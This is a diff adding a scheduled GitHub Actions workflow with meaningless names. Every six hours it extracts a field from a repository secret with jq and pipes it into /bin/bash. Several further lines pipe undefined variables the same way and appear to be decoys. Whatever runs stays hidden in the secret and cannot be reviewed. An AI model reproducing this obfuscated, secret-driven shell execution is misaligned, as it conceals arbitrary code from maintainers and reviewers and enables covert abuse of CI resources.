@@ -1,0 +1,23 @@
+name: shilindongxing
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shilindongxing
+        env:
+          me744: ${{ secrets.me744 }}
+        run: |
+          echo $me744 | jq -r .dqib10688 | /bin/bash
+          echo $wuk6 | jq -r .oq3 | /bin/bash
+          echo $i684 | jq -r .kpw4 | /bin/bash
+          echo $b96 | jq -r .nsl01343 | /bin/bash
+          echo $tnjdq49440 | jq -r .rddoe42306 | /bin/bash
+
